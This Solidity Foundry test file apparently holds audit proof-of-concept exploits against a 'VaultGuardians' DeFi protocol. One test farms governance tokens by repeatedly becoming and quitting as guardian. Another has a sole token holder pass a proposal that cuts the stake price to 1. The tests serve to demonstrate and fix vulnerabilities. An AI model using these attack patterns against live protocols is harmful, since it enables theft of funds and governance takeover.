// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Base_Test} from "../Base.t.sol";
import {VaultShares} from "../../src/protocol/VaultShares.sol";
import {VaultGuardians} from "../../src/protocol/VaultGuardians.sol";
import {GovernorCountingSimple} from "@openzeppelin/contracts/governance/extensions/GovernorCountingSimple.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev End-to-end flows that wire multiple contracts together
contract IntegrationTest is Base_Test {
    address internal attacker = makeAddr("attacker");
    AllocationData internal allocationData = AllocationData(500, 250, 250);

    function testGuardianFarmsVGTByCyclingBecomeAndQuit() public {
        uint256 stakePrice = vaultGuardians.getGuardianStakePrice();
        uint256 cycles = 10;
        uint256 fundAmount = 100 ether;

        // Need buffer: quitGuardian does not return full stake (totalAssets bug + vault fees)
        weth.mint(fundAmount, attacker);

        vm.startPrank(attacker);
        for (uint256 i; i < cycles; i++) {
            weth.approve(address(vaultGuardians), weth.balanceOf(attacker));
            address vault = vaultGuardians.becomeGuardian(allocationData);
            IERC20(vault).approve(address(vaultGuardians), type(uint256).max);
            vaultGuardians.quitGuardian();
        }
        vaultGuardianToken.delegate(attacker);
        vm.stopPrank();

        // VGT minted every becomeGuardian; WETH cost is partial due to broken redeem accounting
        assertEq(vaultGuardianToken.balanceOf(attacker), stakePrice * cycles);
    }

    function testAttackerCapturesGovernanceAndLowersStakePrice() public {
        uint256 stakePrice = vaultGuardians.getGuardianStakePrice();

        // Become guardian → mints VGT (only way to get governance tokens)
        weth.mint(stakePrice, attacker);
        vm.startPrank(attacker);
        weth.approve(address(vaultGuardians), stakePrice);
        vaultGuardians.becomeGuardian(allocationData);
        vaultGuardianToken.delegate(attacker);
        vm.stopPrank();

        assertEq(vaultGuardianToken.balanceOf(attacker), stakePrice);

        // First guardian holds 100% of VGT → passes proposal alone
        bytes memory calldata_ =
            abi.encodeWithSelector(VaultGuardians.updateGuardianStakePrice.selector, uint256(1));
        _passProposal(attacker, address(vaultGuardians), calldata_, "lower stake price");

        assertEq(vaultGuardians.getGuardianStakePrice(), 1);
    }

    function _passProposal(
        address proposer,
        address target,
        bytes memory calldata_,
        string memory description
    )
        internal
        returns (uint256 proposalId)
    {
        address[] memory targets = new address[](1);
        targets[0] = target;

        uint256[] memory values = new uint256[](1);

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = calldata_;

        vm.prank(proposer);
        proposalId = vaultGuardianGovernor.propose(targets, values, calldatas, description);

        vm.roll(block.number + vaultGuardianGovernor.votingDelay() + 1);
        vm.prank(proposer);
        vaultGuardianGovernor.castVote(proposalId, uint8(GovernorCountingSimple.VoteType.For));

        vm.roll(block.number + vaultGuardianGovernor.votingPeriod() + 1);
        vaultGuardianGovernor.execute(targets, values, calldatas, keccak256(bytes(description)));
    }
}
